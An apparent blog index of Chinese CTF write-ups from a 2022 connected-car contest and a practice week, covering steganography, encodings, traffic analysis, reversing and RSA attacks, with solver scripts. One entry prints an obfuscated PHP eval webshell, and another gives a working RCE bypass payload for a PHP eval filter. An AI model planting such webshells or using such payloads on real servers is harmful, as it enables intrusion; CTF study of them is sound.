[{"categories":["WriteUp"],"content":"\r","date":"2022-04-25","objectID":"/2022-04-25-2022-cicv%E6%99%BA%E8%83%BD%E7%BD%91%E8%81%94%E6%B1%BD%E8%BD%A6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%B5%9Bwriteup-binx4/:0:0","tags":["CTF"],"title":"2022 CICV智能网联汽车漏洞挖掘赛Writeup–BinX4","uri":"/2022-04-25-2022-cicv%E6%99%BA%E8%83%BD%E7%BD%91%E8%81%94%E6%B1%BD%E8%BD%A6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%B5%9Bwriteup-binx4/"},{"categories":["WriteUp"],"content":"0x00 仔细看图片 图片用010打开发现有PK，也就是说包含压缩包，用foremost解出来，解压得到两个png文件，但其实都是zip。 flag3有密码，flag1解压得到hint，密码是4位，爆破得到6666，解压得到realflag的图片，使用stegsolve查看发现是lsb隐写。 ","date":"2022-04-25","objectID":"/2022-04-25-2022-cicv%E6%99%BA%E8%83%BD%E7%BD%91%E8%81%94%E6%B1%BD%E8%BD%A6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%B5%9Bwriteup-binx4/:1:0","tags":["CTF"],"title":"2022 CICV智能网联汽车漏洞挖掘赛Writeup–BinX4","uri":"/2022-04-25-2022-cicv%E6%99%BA%E8%83%BD%E7%BD%91%E8%81%94%E6%B1%BD%E8%BD%A6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%B5%9Bwriteup-binx4/"},{"categories":["WriteUp"],"content":"0x01 图片仔细看 补文件头，ocr识别flag。 ","date":"2022-04-25","objectID":"/2022-04-25-2022-cicv%E6%99%BA%E8%83%BD%E7%BD%91%E8%81%94%E6%B1%BD%E8%BD%A6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%B5%9Bwriteup-binx4/:2:0","tags":["CTF"],"title":"2022 CICV智能网联汽车漏洞挖掘赛Writeup–BinX4","uri":"/2022-04-25-2022-cicv%E6%99%BA%E8%83%BD%E7%BD%91%E8%81%94%E6%B1%BD%E8%BD%A6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%B5%9Bwriteup-binx4/"},{"categories":["WriteUp"],"content":"0x02 简单的流量分析 在pcapang导出secret.png，可以发现密码是9527。 拼接二维码，得到BASE Family Bucket ??? 85-\u003e64-\u003e85-\u003e16-\u003e32 将编码后的flag反着顺序解即可。 GM4TMRBUII3EMMZVGM4TIQJUIMZTGNBZGQYDGOBWGY3DCMZSGNBTINJTGI2DANKGGNBTKRJXGEZDKMRUGM4TMOJUIY2TGNZRGQYDKMRVHEZTMMRWGQYDKNRUII3DINKDGNBTMMRWGIZTMMRSGM4DKMZXGE2DAMSGGM4TMOJWIIZDQNJVGM4TIRJTIU2TGNCBGM4TKMBVIIZECNRZGNBTIOBWG42TGNRY ","date":"2022-04-25","objectID":"/2022-04-25-2022-cicv%E6%99%BA%E8%83%BD%E7%BD%91%E8%81%94%E6%B1%BD%E8%BD%A6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%B5%9Bwriteup-binx4/:3:0","tags":["CTF"],"title":"2022 CICV智能网联汽车漏洞挖掘赛Writeup–BinX4","uri":"/2022-04-25-2022-cicv%E6%99%BA%E8%83%BD%E7%BD%91%E8%81%94%E6%B1%BD%E8%BD%A6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%B5%9Bwriteup-binx4/"},{"categories":["WriteUp"],"content":"0x03 解析音频 slienteye导出flag.txt U2FsdGVkX1/ZEFKooGZ4A22yxGmim1eB4vd9WpPhd//5+gaGmmntCgvb1GRoIVyc\rRC4.txt里面的内容是社会核心价值观编码，解码得到!@#$123 文明民主自由富强文明和谐文明自由和谐民主和谐文明和谐和谐\r在http://tools.jb51.net/password/rc4_encode进行解码即可得到flag。 ","date":"2022-04-25","objectID":"/2022-04-25-2022-cicv%E6%99%BA%E8%83%BD%E7%BD%91%E8%81%94%E6%B1%BD%E8%BD%A6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%B5%9Bwriteup-binx4/:4:0","tags":["CTF"],"title":"2022 CICV智能网联汽车漏洞挖掘赛Writeup–BinX4","uri":"/2022-04-25-2022-cicv%E6%99%BA%E8%83%BD%E7%BD%91%E8%81%94%E6%B1%BD%E8%BD%A6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%B5%9Bwriteup-binx4/"},{"categories":["WriteUp"],"content":"0x04 ECU里的秘密2 from secret import flag from Crypto.Util.number import * def str_to_num(s): hex_str = \"\" for i in s: hex_str += str(hex(ord(i))).lstrip(\"0x\") hex_str = \"0x\" + hex_str return int(hex_str, 16) m = str_to_num(flag) p = getPrime(512) q = getPrime(512) N = p * q phi = (p - 1) * (q - 1) while True: d = getRandomNBitInteger(200) if GCD(d, phi) == 1: e = inverse(d, phi) break c = pow(m, e, N) print(c, e, N, sep='\\n') # 96584061026622286545063291472705181084679814412466522587332144648224314426683416287931941578413761077731726929424331173278337209260050307977205606452443160420855302024555391000793908017297496869820804390143456078669337507653382366071312278105951084198007936575990063383671858795989636957929380428362598898072 # 11740351751510047446998714931350993714396628211280864776110365123347173396583484316711458774029527500611296039150039564763614020683799796903523006439087198226393520091053520335273342829170104532491355478575580428692888260006028265274689967321629212892513652812670695278373844528403181961613120252670745571053 # 123438036035406535460511166374496077384102026741092288198344700861685906636796768225396940612586706260451017163138041088510652554400234468565585667747104196712115968244305594612024378291259754742916440514116686940788878250978559510464853412265657110705149547843302525328641075595384934547819346900278850047889 e很大，明显是维纳攻击 import RSAwienerHacker import hashlib from Crypto.Util.number import * e= 11740351751510047446998714931350993714396628211280864776110365123347173396583484316711458774029527500611296039150039564763614020683799796903523006439087198226393520091053520335273342829170104532491355478575580428692888260006028265274689967321629212892513652812670695278373844528403181961613120252670745571053 n= 123438036035406535460511166374496077384102026741092288198344700861685906636796768225396940612586706260451017163138041088510652554400234468565585667747104196712115968244305594612024378291259754742916440514116686940788878250978559510464853412265657110705149547843302525328641075595384934547819346900278850047889 c = 96584061026622286545063291472705181084679814412466522587332144648224314426683416287931941578413761077731726929424331173278337209260050307977205606452443160420855302024555391000793908017297496869820804390143456078669337507653382366071312278105951084198007936575990063383671858795989636957929380428362598898072 d = RSAwienerHacker.hack_RSA(e,n) m = pow(c,d,n) flag = long_to_bytes(m) print flag ","date":"2022-04-25","objectID":"/2022-04-25-2022-cicv%E6%99%BA%E8%83%BD%E7%BD%91%E8%81%94%E6%B1%BD%E8%BD%A6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%B5%9Bwriteup-binx4/:5:0","tags":["CTF"],"title":"2022 CICV智能网联汽车漏洞挖掘赛Writeup–BinX4","uri":"/2022-04-25-2022-cicv%E6%99%BA%E8%83%BD%E7%BD%91%E8%81%94%E6%B1%BD%E8%BD%A6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%B5%9Bwriteup-binx4/"},{"categories":["WriteUp"],"content":"0x05 细心 改后缀名为zip，解压在media里面看到一个可疑的二维码，扫描得到flag。 ","date":"2022-04-25","objectID":"/2022-04-25-2022-cicv%E6%99%BA%E8%83%BD%E7%BD%91%E8%81%94%E6%B1%BD%E8%BD%A6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%B5%9Bwriteup-binx4/:6:0","tags":["CTF"],"title":"2022 CICV智能网联汽车漏洞挖掘赛Writeup–BinX4","uri":"/2022-04-25-2022-cicv%E6%99%BA%E8%83%BD%E7%BD%91%E8%81%94%E6%B1%BD%E8%BD%A6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%B5%9Bwriteup-binx4/"},{"categories":["WriteUp"],"content":"0x06 眼见为实吗？ 改后缀名为zip，在word/document.xml发现flag ","date":"2022-04-25","objectID":"/2022-04-25-2022-cicv%E6%99%BA%E8%83%BD%E7%BD%91%E8%81%94%E6%B1%BD%E8%BD%A6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%B5%9Bwriteup-binx4/:7:0","tags":["CTF"],"title":"2022 CICV智能网联汽车漏洞挖掘赛Writeup–BinX4","uri":"/2022-04-25-2022-cicv%E6%99%BA%E8%83%BD%E7%BD%91%E8%81%94%E6%B1%BD%E8%BD%A6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%B5%9Bwriteup-binx4/"},{"categories":["WriteUp"],"content":"0x07 图片不见了 根据wsxdrfvtgbuhb85799zsedcftgb猜测是键盘密码，wv85799m，解压得到一张图片，010打开在文件尾部发现flag。 ","date":"2022-04-25","objectID":"/2022-04-25-2022-cicv%E6%99%BA%E8%83%BD%E7%BD%91%E8%81%94%E6%B1%BD%E8%BD%A6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%B5%9Bwriteup-binx4/:8:0","tags":["CTF"],"title":"2022 CICV智能网联汽车漏洞挖掘赛Writeup–BinX4","uri":"/2022-04-25-2022-cicv%E6%99%BA%E8%83%BD%E7%BD%91%E8%81%94%E6%B1%BD%E8%BD%A6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%B5%9Bwriteup-binx4/"},{"categories":["WriteUp"],"content":"0x08 不要乱安装运行文件 用ig搜索目录下的flag字符串 搜到两个flag，由于其中一个flag和前面的题目重复了，所以只需要提交另一个就可以。 ","date":"2022-04-25","objectID":"/2022-04-25-2022-cicv%E6%99%BA%E8%83%BD%E7%BD%91%E8%81%94%E6%B1%BD%E8%BD%A6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%B5%9Bwriteup-binx4/:9:0","tags":["CTF"],"title":"2022 CICV智能网联汽车漏洞挖掘赛Writeup–BinX4","uri":"/2022-04-25-2022-cicv%E6%99%BA%E8%83%BD%E7%BD%91%E8%81%94%E6%B1%BD%E8%BD%A6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%B5%9Bwriteup-binx4/"},{"categories":["WriteUp"],"content":"0x09 这是一个控车说明文档吗？ 分析判断doc文件实为rar，且存在密码，拿到LostMyPass网站上跑密码，得到123456。 解压得到flag。 ","date":"2022-04-25","objectID":"/2022-04-25-2022-cicv%E6%99%BA%E8%83%BD%E7%BD%91%E8%81%94%E6%B1%BD%E8%BD%A6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%B5%9Bwriteup-binx4/:10:0","tags":["CTF"],"title":"2022 CICV智能网联汽车漏洞挖掘赛Writeup–BinX4","uri":"/2022-04-25-2022-cicv%E6%99%BA%E8%83%BD%E7%BD%91%E8%81%94%E6%B1%BD%E8%BD%A6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%B5%9Bwriteup-binx4/"},{"categories":["WriteUp"],"content":"0x0A 串口的秘密 1.Enter Serial 函数定位关键函数sub_400D48 2.Ida 反汇编进入函数 sub_400D48 3.使if 判断不成立 得出字符串 a 为 a = [‘T’, ‘z’, ’e’, ‘y’, ‘7’, ‘-’, ’d’, ‘r’, ‘F’, ‘L’, ‘T’, ‘-’, ‘c’, ’t’, ‘f’, ‘g’, ‘H’, ‘5’, ‘-’, ‘p’, ‘u’, ‘T’, ‘F’, ‘6’, ‘Y’] v9与字符串a异或更新 v9的值 解密脚本 a = ['T', 'z', 'e', 'y', '7', '-', 'd', 'r', 'F', 'L', 'T', '-',\\\r'c', 't', 'f', 'g', 'H', '5', '-', 'p', 'u', 'T', 'F', '6', 'Y']\rv1 = [0]*4\rv1[0] = b'\\xFE\\xC4\\xA6\\xF9\\xE4\\xF8\\xB1\\xD9'\rv1[1] = b'\\xD2\\xAB\\xA6\\xF0\\xE6\\x9A\\xC1\\x8A'\rv1[2] = b'\\x9D\\xDA\\xC0\\xE9\\xFB\\xEA\\x82\\xF5'\rv1[3] = b'\\xCC'\rb = v1[0][::-1]+v1[1][::-1]+v1[2][::-1]+v1[3]\rb = list(b)\rc = [0]*25\rfor i in range(len(a)):\rc[i] = ord(a[i])^ (~(b[i])%256)\rprint(''.join(chr(i) for i in c))\r","date":"2022-04-25","objectID":"/2022-04-25-2022-cicv%E6%99%BA%E8%83%BD%E7%BD%91%E8%81%94%E6%B1%BD%E8%BD%A6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%B5%9Bwriteup-binx4/:11:0","tags":["CTF"],"title":"2022 CICV智能网联汽车漏洞挖掘赛Writeup–BinX4","uri":"/2022-04-25-2022-cicv%E6%99%BA%E8%83%BD%E7%BD%91%E8%81%94%E6%B1%BD%E8%BD%A6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%B5%9Bwriteup-binx4/"},{"categories":["WriteUp"],"content":"0x0B 文件加解密 Key.html 提取flag值 Hex解密得 jsfuck代码 Jsfuck解密得到 js代码 Base64解密PHNyY2lwdD5hbGVydCgiZmxhZ3s2NmI4YzRkMDFjMzI2NDljZTZkMzU0NzkwMTg5OGE4NX0iKTwvc2NyaXB0Pg得\u003csrcipt\u003ealert(\"flag{66b8c4d01c32649ce6d3547901898a85}\")\u003c/script\u003e ","date":"2022-04-25","objectID":"/2022-04-25-2022-cicv%E6%99%BA%E8%83%BD%E7%BD%91%E8%81%94%E6%B1%BD%E8%BD%A6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%B5%9Bwriteup-binx4/:12:0","tags":["CTF"],"title":"2022 CICV智能网联汽车漏洞挖掘赛Writeup–BinX4","uri":"/2022-04-25-2022-cicv%E6%99%BA%E8%83%BD%E7%BD%91%E8%81%94%E6%B1%BD%E8%BD%A6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%B5%9Bwriteup-binx4/"},{"categories":["WriteUp"],"content":"0x0C 控车密码完了 Jeb反编译apk文件，定位如下关键代码，找到相应字符串，编码解出flag ","date":"2022-04-25","objectID":"/2022-04-25-2022-cicv%E6%99%BA%E8%83%BD%E7%BD%91%E8%81%94%E6%B1%BD%E8%BD%A6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%B5%9Bwriteup-binx4/:13:0","tags":["CTF"],"title":"2022 CICV智能网联汽车漏洞挖掘赛Writeup–BinX4","uri":"/2022-04-25-2022-cicv%E6%99%BA%E8%83%BD%E7%BD%91%E8%81%94%E6%B1%BD%E8%BD%A6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%B5%9Bwriteup-binx4/"},{"categories":["WriteUp"],"content":"0x0D 最长的套路 树的直径（最长路径）证明：https://www.cnblogs.com/wuyiqi/archive/2012/04/08/2437424.html #处理html部分\rfrom bs4 import BeautifulSoup\rfrom collections import deque\rimport re\rwith open(\"Maze.html\", \"r\") as file:\rhtml_doc = file.read()\rsoup = BeautifulSoup(html_doc, 'html.parser')\rlattice = soup.find_all('td')\rpattern = re.compile(r'border-([a-z]+):')\rmaze = []\rfor j in range(100):\rtemp1 = []\rfor i in range(j * 100, j * 100 + 100):\rtemp = \"\"\rresult = pattern.findall(str(lattice[i]))\rprint(result)\rif 'top' not in result:\rtemp += \"u\"\rif 'bottom' not in result:\rtemp += \"d\"\rif 'right' not in result:\rtemp += \"r\"\rif 'left' not in result:\rtemp += \"l\"\rtemp1.append(temp)\rmaze.append(temp1)\rmove = {'u': (-1, 0), 'd': (1, 0), 'l': (0, -1), 'r': (0, 1)}\rqueue = deque()\rqueue.append(((70,22), 0))\rvisited = []\rans = 0\ransv = ()\rwhile queue:\rv, res = queue.popleft()\rif res \u003e ans:\rans = res\ransv = v\rif v not in visited:\rvisited.append(v)\rfor adj in maze[v[0]][v[1]]:\rqueue.append(((v[0] + move[adj][0], v[1] + move[adj][1]), res + 1))\rprint(ansv, ans)\r结果最长路径为4056 ","date":"2022-04-25","objectID":"/2022-04-25-2022-cicv%E6%99%BA%E8%83%BD%E7%BD%91%E8%81%94%E6%B1%BD%E8%BD%A6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%B5%9Bwriteup-binx4/:14:0","tags":["CTF"],"title":"2022 CICV智能网联汽车漏洞挖掘赛Writeup–BinX4","uri":"/2022-04-25-2022-cicv%E6%99%BA%E8%83%BD%E7%BD%91%E8%81%94%E6%B1%BD%E8%BD%A6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%B5%9Bwriteup-binx4/"},{"categories":["WriteUp"],"content":"0x0E 签到2 根据图片中信号格式，可以看出这是一个UART协议的信号，根据UART协议的说明，我们可以将信号分为1位低电平起始位，8位数据位和1位高电平停止位，由此把数据分成若干组，如下图记录。 、 连接起来便是一串数字，经过数据翻转和二进制转换后，可以得到flag。 01100110001101101000011011100110110111100001110001000110110011001000011011000110111011000110110000101100011001101001110010101100111011000001110010011100011011000100110010100110110001100000110000011100001011001000011001001100001011001100011001000110110001101001110010001100101001101010011010011100101111101011000001010000 ","date":"2022-04-25","objectID":"/2022-04-25-2022-cicv%E6%99%BA%E8%83%BD%E7%BD%91%E8%81%94%E6%B1%BD%E8%BD%A6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%B5%9Bwriteup-binx4/:15:0","tags":["CTF"],"title":"2022 CICV智能网联汽车漏洞挖掘赛Writeup–BinX4","uri":"/2022-04-25-2022-cicv%E6%99%BA%E8%83%BD%E7%BD%91%E8%81%94%E6%B1%BD%E8%BD%A6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%B5%9Bwriteup-binx4/"},{"categories":["WriteUp"],"content":"0x0F wav音频的故事2 下载音频后，可以放进audacity中进行观察，发现这段音频每隔几秒会有一段数据，看频谱图可以发现这段数据有的存在红线，而有的没有红线。可以猜测这可能是一个摩斯密码，频谱的红线用来区分.和-，因此可以把密码记录下来。 -----.- ----. ..... ....- ...-- ---.. ..--- .- -.... -.. -.-. -.-. ..-. --... -.. --... .- ----. ----. ...-- ..... .---- ..--- .---- ..... ....- -.... --... ..--- -.-. -.. .---- ..-. ----.-- --. .- .-.. ..-. 解密码，但是翻转一下就得到flag。 ","date":"2022-04-25","objectID":"/2022-04-25-2022-cicv%E6%99%BA%E8%83%BD%E7%BD%91%E8%81%94%E6%B1%BD%E8%BD%A6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%B5%9Bwriteup-binx4/:16:0","tags":["CTF"],"title":"2022 CICV智能网联汽车漏洞挖掘赛Writeup–BinX4","uri":"/2022-04-25-2022-cicv%E6%99%BA%E8%83%BD%E7%BD%91%E8%81%94%E6%B1%BD%E8%BD%A6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%B5%9Bwriteup-binx4/"},{"categories":["WriteUp"],"content":"0x10 web网站被黑了 下载文件发现是个PHP，里面有很多字符，转换发现这是个一句话木马，里面的连接密码是a，a加密md5为flag。 \u003cscript langukeye=php\u003e $_1=chr(97).chr(115).chr(115).chr(101).chr(114).chr(116); @$_1(chr(64).chr(101).chr(118).chr(97).chr(108).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(97).chr(93).chr(41).chr(59)); \u003c/script\u003e ","date":"2022-04-25","objectID":"/2022-04-25-2022-cicv%E6%99%BA%E8%83%BD%E7%BD%91%E8%81%94%E6%B1%BD%E8%BD%A6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%B5%9Bwriteup-binx4/:17:0","tags":["CTF"],"title":"2022 CICV智能网联汽车漏洞挖掘赛Writeup–BinX4","uri":"/2022-04-25-2022-cicv%E6%99%BA%E8%83%BD%E7%BD%91%E8%81%94%E6%B1%BD%E8%BD%A6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%B5%9Bwriteup-binx4/"},{"categories":["WriteUp"],"content":"0x11 图片不见了 观察流量包，试着导出HTTP对象，发现一个奇怪的文件。 追踪这个流量可以发现百度网盘的资源地址，https://pan.baidu.com/s/1TV3hZK5kqLx3uxcYn0EyMw?pwd=7p61，下载后得到一张知乎图片，丢进Stegsolve，检查LSB隐写的时候可以发现nslookup，md5加密为flag。 ","date":"2022-04-25","objectID":"/2022-04-25-2022-cicv%E6%99%BA%E8%83%BD%E7%BD%91%E8%81%94%E6%B1%BD%E8%BD%A6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%B5%9Bwriteup-binx4/:18:0","tags":["CTF"],"title":"2022 CICV智能网联汽车漏洞挖掘赛Writeup–BinX4","uri":"/2022-04-25-2022-cicv%E6%99%BA%E8%83%BD%E7%BD%91%E8%81%94%E6%B1%BD%E8%BD%A6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%B5%9Bwriteup-binx4/"},{"categories":["WriteUp"],"content":"0x12 补个成绩 纯纯靠车神的案例带飞，又是摆烂的一天。 ","date":"2022-04-25","objectID":"/2022-04-25-2022-cicv%E6%99%BA%E8%83%BD%E7%BD%91%E8%81%94%E6%B1%BD%E8%BD%A6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%B5%9Bwriteup-binx4/:19:0","tags":["CTF"],"title":"2022 CICV智能网联汽车漏洞挖掘赛Writeup–BinX4","uri":"/2022-04-25-2022-cicv%E6%99%BA%E8%83%BD%E7%BD%91%E8%81%94%E6%B1%BD%E8%BD%A6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%B5%9Bwriteup-binx4/"},{"categories":["WriteUp"],"content":"\r","date":"2022-04-11","objectID":"/2022-04-11-ctf%E7%BB%83%E4%B9%A0week3/:0:0","tags":["CTF"],"title":"CTF练习Week3","uri":"/2022-04-11-ctf%E7%BB%83%E4%B9%A0week3/"},{"categories":["WriteUp"],"content":"0x00 TLS-简简单单套个娃 010打开文件发现文件头为PK，修改后缀名，在备注发现摩斯密码 ...-- ...-- .---- ..-. -.. .- .- -.-. -.. .- .---- .- ----- ..-. ----. .- -.-. ---.. --... ..... .---- .- ...-- .- ...-- ..--- ..... . ----. -.-. ..... . 解密得到331FDAACDA1A0F9AC8751A3A325E9C5E，感觉像MD5，解一下得到qwe!123，得到新文件，打开发现文件头和IEND的crc有问题，修改后得到一个二维码。 扫描得到 零宽字符隐写。 ","date":"2022-04-11","objectID":"/2022-04-11-ctf%E7%BB%83%E4%B9%A0week3/:1:0","tags":["CTF"],"title":"CTF练习Week3","uri":"/2022-04-11-ctf%E7%BB%83%E4%B9%A0week3/"},{"categories":["WriteUp"],"content":"0x01 TLS-tls_new_re1 分析代码可以发现是将flag先减3再和9进行异或 编写脚本 flag=\"\"\rx=\"j`Wmq]k`ieckUxeUX@Ys\"\rfor i in range(len(x)):\rflag+=chr((ord(x[i])^9)+3)\rprint(flag)\r","date":"2022-04-11","objectID":"/2022-04-11-ctf%E7%BB%83%E4%B9%A0week3/:2:0","tags":["CTF"],"title":"CTF练习Week3","uri":"/2022-04-11-ctf%E7%BB%83%E4%B9%A0week3/"},{"categories":["WriteUp"],"content":"0x02 TLS-EAZYRCE \u003c?php highlight_file(__FILE__); $exp = $_GET['exp']; //php7.3 + Apache if(';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $exp)) { if(!preg_match(\"/o|v|b|print|var|time|file|sqrt|path|dir|exp|pi|an|na|en|ex|et|na|dec|true|false|[0-9]/i\", $exp)){ eval($exp); }else{ exit('NoNoNo,U R Hacker~'); } }else{ exit(\"What's this?\"); } 构造payload为exp=system(array_shift(apache_request_headers()));和flag: cat /flag ","date":"2022-04-11","objectID":"/2022-04-11-ctf%E7%BB%83%E4%B9%A0week3/:3:0","tags":["CTF"],"title":"CTF练习Week3","uri":"/2022-04-11-ctf%E7%BB%83%E4%B9%A0week3/"},{"categories":["WriteUp"],"content":"0x03 TLS-simpleRSA 这个题真的是人生无常，大肠包小肠。分阶段记录一下吧 #!/usr/bin/env python3.9 # -*- coding: utf-8 -*- import gmpy2 from Crypto.Util.number import getPrime, isPrime, bytes_to_long from secret import FLAG, E1, E2, P, Q1, Q2 def next_prime(num: int) -\u003e int: num = num + 2 if num % 2 else num + 1 while not isPrime(num): num += 2 return num p = getPrime(1024) q = next_prime(13 * p + 52433) n = p * q c = pow(E1, 65537, n) print(f'n = {n}') print(f'c = {c}') # n = 259890247443804761118228016219136684924167917522422806784955644506207888351304889509903433463527585637662916733749092132376942374314732903500147772464631303079816368071397816148840032140257741234623942972389330658394009752410215122103809627221978841602901343785314357668760003964914166778126289222020290468903953247175457923739210505739006832916267484268910832870071479071917094394577029957202256240184604809173087617931324803860474150820931470601204798293536446102918790547726389486804819530604731780327035091686886029998993701502986883473430288066966414564995833243607159289786503640253962387954613582807541606942749 # c = 56440807794784873155975554526282639269465966474628218727704063243557056715418468759474870838438499918826893792546655715745526027857276713541238255702873551647125573694638955842404342457788336135938834876470872953749978996773098030211241264236735693391584657468679440790473717213665228349818831369116042003502072082694693222429663702695116191467500411709133178801495474342969042325471712020201636143305265100439673243718028002788717655896374089009854112149946761782391009483256739835432971090640363725440908313218581221815215679758846253486316393841855585127055921605329511990315967829323041426287669986012868743294383 这个首先联想到，用n/13后开平方根，最后往前查找素数，应该能找到，可以求出E1。 p = gmpy2.iroot(n//13,2)[0] while 1: p = sympy.prevprime(p) q = sympy.nextprime(13 * p + 52433) if(q == n//p): break phi = (p-1)*(q-1) d = gmpy2.invert(65537, phi) E1 = pow(c, int(d), n) print(E1) assert E2.bit_length() == 68 ns = [getPrime(1024) * getPrime(1024) for _ in range(3)] cs = [pow(E2, 89, n) for n in ns] print(f'ns = {ns}') print(f'cs = {cs}') # ns = [14768877816717539611731045629979591214811330868162202565624664129912032603118216104003405398241174001521124840138476411692247747689580245229633834241354343663803512914327061439026544199607661340809522611714979050746642474298514984319799503942592454459033529230661408387428307100152240359931113582007834771064836814506679488489884326758202775879875295915804661697151797257882534759047427072076935608038544138918082424231665777438859097733700757281503798641211223630919282623055222757291265697646847664236117770057816055708821059139836629062435882101110861519241590121890490749372041394827106099992940775405355963537093, 19666545323134160617662045141655785833630626383149539459109151988125669512345207825350175718697646952110980014593295830440913639941294759366636907406022093593567085060130487695457293050838339751589656086715810761617034895110908921222238432080750232780959480802362123627948837433700702719795982826451033532941818523986557921585705333167085832750810602154544395282520714531925732606981719148520396524986802623258451137156083339557903763787258971153135598507990986538670962098805822026704693511638643139987774524413005609600478133862229864877539603414684417042041304917739974092129299946247802874434223813699963768959763, 15779368467163552829155887858552042780948412851484383573815791940301167449302309346542230278336893665527037182849622548454420128882466125704119621262910314425821276866328941773658802929134316373368772517587582142657657900715575360467459524840118867966716907874327634603692474154990530124677535030772815052167989006001122992617640466985679436530404398438789489536785124944395405233412010429769188201394928826199790856798037225834203918546557553132305324936899974409559438594918135814322834671435422502955119706510092210390004609239572208028155476305714319440640836664426079307167151133383912378800774498518280438182203] # cs = [56785078051077421764389661265568","date":"2022-04-11","objectID":"/2022-04-11-ctf%E7%BB%83%E4%B9%A0week3/:4:0","tags":["CTF"],"title":"CTF练习Week3","uri":"/2022-04-11-ctf%E7%BB%83%E4%B9%A0week3/"},{"categories":["WriteUp"],"content":"0x04 2022数字中国车联网-车联网签到 跑完一圈就给flag ","date":"2022-04-11","objectID":"/2022-04-11-ctf%E7%BB%83%E4%B9%A0week3/:5:0","tags":["CTF"],"title":"CTF练习Week3","uri":"/2022-04-11-ctf%E7%BB%83%E4%B9%A0week3/"},{"categories":["WriteUp"],"content":"0x05 2022数字中国车联网-the secret of car 读usb键盘流量，使用命令tshark -r car.pcapng -T fields -e usb.capdata \u003e usbdata.txt，删除空行和非键盘数据。使用如下脚本： mappings = { 0x04:\"A\", 0x05:\"B\", 0x06:\"C\", 0x07:\"D\", 0x08:\"E\", 0x09:\"F\", 0x0A:\"G\", 0x0B:\"H\", 0x0C:\"I\", 0x0D:\"J\", 0x0E:\"K\", 0x0F:\"L\", 0x10:\"M\", 0x11:\"N\",0x12:\"O\", 0x13:\"P\", 0x14:\"Q\", 0x15:\"R\", 0x16:\"S\", 0x17:\"T\", 0x18:\"U\",0x19:\"V\", 0x1A:\"W\", 0x1B:\"X\", 0x1C:\"Y\", 0x1D:\"Z\", 0x1E:\"1\", 0x1F:\"2\", 0x20:\"3\", 0x21:\"4\", 0x22:\"5\", 0x23:\"6\", 0x24:\"7\", 0x25:\"8\", 0x26:\"9\", 0x27:\"0\", 0x28:\"\\n\", 0x2a:\"[DEL]\", 0X2B:\" \", 0x2C:\" \", 0x2D:\"-\", 0x2E:\"=\", 0x2F:\"[\", 0x30:\"]\", 0x31:\"\\\\\", 0x32:\"~\", 0x33:\";\", 0x34:\"'\", 0x36:\",\", 0x37:\".\" } nums = [] keys = open('usbdata.txt') for line in keys: if line[0]!='0' or line[1]!='0' or line[2]!='0' or line[3]!='0' or line[6]!='0' or line[7]!='0' or line[8]!='0' or line[9]!='0' or line[10]!='0' or line[11]!='0' or line[12]!='0' or line[13]!='0' or line[14]!='0' or line[15]!='0': continue nums.append(int(line[4:6],16)) keys.close() output = \"\" for n in nums: if n == 0 : continue if n in mappings: output += mappings[n] else: output += '[unknown]' print 'output :\\n' + output 得到信息PASSWORD1 [unknown]V3HICL3NE7WORKIN91S 拿到一堆车联网的流量包，使用binwalk分析，发现存在压缩包，foremost导出，得到 password2: ..--.-/../--/.--./---/.-./-/.-/-./-/..--.-/..---/..--.-/..-/.-.../--/.\r解码得到_IMPORTANT_2_U\u0026ME，拼接到一块儿，前面补齐下划线得到V3HICL3_NE7WORKIN9_1S_IMPORTANT_2_U\u0026ME，解压图片后名称为wbs43open.bmp，直接用wbs43open解密得到flag。 